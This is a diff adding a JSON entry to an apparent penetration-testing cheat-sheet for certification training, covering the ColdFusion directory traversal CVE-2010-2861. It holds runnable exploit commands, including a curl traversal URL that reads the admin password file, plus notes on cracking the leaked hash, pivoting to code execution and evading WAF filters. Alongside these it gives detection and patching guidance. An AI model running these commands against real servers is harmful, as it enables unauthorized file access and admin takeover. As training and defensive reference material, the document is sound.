@@ -1,0 +1,118 @@
+{
+  "id": "coldfusion-directory-traversal",
+  "name": "ColdFusion - Directory Traversal (CVE-2010-2861)",
+  "command": "python2 14641.py <ip> <port> \"<file_path>\"",
+  "description": "Adobe ColdFusion 9.0.1 and earlier expose an unauthenticated directory traversal through the unvalidated locale parameter of several administrator .cfm files (CVE-2010-2861). Reading /lib/password.properties leaks the encrypted administrator password, which decrypts/cracks to the admin console - the pivot to authenticated RCE (scheduled task / FCKeditor upload).",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "searchsploit",
+    "python2",
+    "curl"
+  ],
+  "tags": [
+    "coldfusion",
+    "directory-traversal",
+    "lfi",
+    "cve-2010-2861",
+    "information-disclosure"
+  ],
+  "category": "Exploitation",
+  "subcategory": "ColdFusion",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "variations": [
+    {
+      "label": "Manual traversal via the vulnerable locale parameter (no script)",
+      "command": "curl \"http://<ip>:<port>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Find the exploit with searchsploit",
+      "command": "searchsploit adobe coldfusion"
+    },
+    {
+      "label": "Copy the EDB script to the working dir",
+      "command": "searchsploit -p 14641 && cp /usr/share/exploitdb/exploits/multiple/remote/14641.py ."
+    },
+    {
+      "label": "See required args",
+      "command": "python2 14641.py   # usage: 14641.py <host> <port> <file_path>"
+    },
+    {
+      "label": "Read the admin password store (proves CVE-2010-2861)",
+      "command": "python2 14641.py 10.129.204.230 8500 \"../../../../../../../../ColdFusion8/lib/password.properties\""
+    }
+  ],
+  "notes": "Vulnerable admin files all take a traversable locale param: CFIDE/administrator/settings/mappings.cfm, logging/settings.cfm, datasources/index.cfm, j2eepackaging/editarchive.cfm, CFIDE/administrator/enter.cfm. Target file /[cf_root]/lib/password.properties holds the SHA1/encrypted admin password (password=..., encrypted=true) plus rdspassword. On CF8 the hash is an unsalted SHA1 of the admin password - crack it, log into /CFIDE/administrator/, then get RCE via a scheduled task or the FCKeditor upload (see coldfusion-unauth-rce). Windows path uses ColdFusion8\\lib; on Linux adjust the traversal depth to reach the install root. Also covered in: OSCP PEN-200 (Web Application Attacks).",
+  "references": [
+    {
+      "title": "Exploit-DB 14641 - Adobe ColdFusion Directory Traversal",
+      "url": "https://www.exploit-db.com/exploits/14641"
+    },
+    {
+      "title": "NVD - CVE-2010-2861",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2861"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "coldfusion-discovery",
+      "note": "Fingerprint the ColdFusion version first - this CVE is <=9.0.1.",
+      "rel": "prereq"
+    },
+    {
+      "id": "coldfusion-unauth-rce",
+      "note": "After cracking the leaked admin hash (or directly), go for code execution.",
+      "rel": "next"
+    },
+    {
+      "id": "other-apps-defaults",
+      "note": "Try default/leaked creds against the admin console.",
+      "rel": "alternative"
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1190",
+    "T1083"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "prerequisites": "Adobe ColdFusion 9.0.1 or earlier reachable over HTTP (default 8500). No credentials required - the vulnerable administrator .cfm files are pre-auth.",
+    "why_it_works": "The locale parameter of several administrator .cfm pages is passed to a file read without path canonicalization or validation, so ../ sequences escape the intended directory and read arbitrary files as the ColdFusion service account.",
+    "misconfiguration": "Unpatched ColdFusion (<=9.0.1) with the /CFIDE/administrator/ console exposed to the network; the locale parameter accepts traversal sequences.",
+    "impact": "Arbitrary file read as the CF service user. Reading /lib/password.properties yields the admin console password (unsalted SHA1 on CF8), which grants admin access and, through it, remote code execution.",
+    "detection": "Web access log: GET to mappings.cfm / enter.cfm / index.cfm with locale= containing ../ or encoded ..%2f. Requests to password.properties. IDS signatures for CVE-2010-2861.",
+    "artifacts": "Access-log entries with traversal in the locale parameter; reads of password.properties; scanner User-Agents hitting /CFIDE/administrator/ paths.",
+    "vulnerable_config": "# ColdFusion <= 9.0.1, /CFIDE/administrator reachable\n# mappings.cfm?locale=<user input> -> file read, no canonicalization",
+    "secure_config": "# Apply Adobe hotfix APSB10-18 (patches CVE-2010-2861)\n# Restrict /CFIDE/administrator to internal IPs / VPN only\n# Run CF as a low-privilege account; enforce an allowlist for locale values",
+    "prevention": "Patch to a fixed ColdFusion version (APSB10-18). Restrict the admin console to management networks. Canonicalize and allowlist the locale value. Run ColdFusion as a least-privilege service account. [MITRE M1050, M1042]",
+    "evasion": "URL-encode or double-encode the ../ sequence to slip past naive WAF signatures; vary traversal depth to reach the install root.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1083",
+      "CVE-2010-2861"
+    ]
+  }
+}
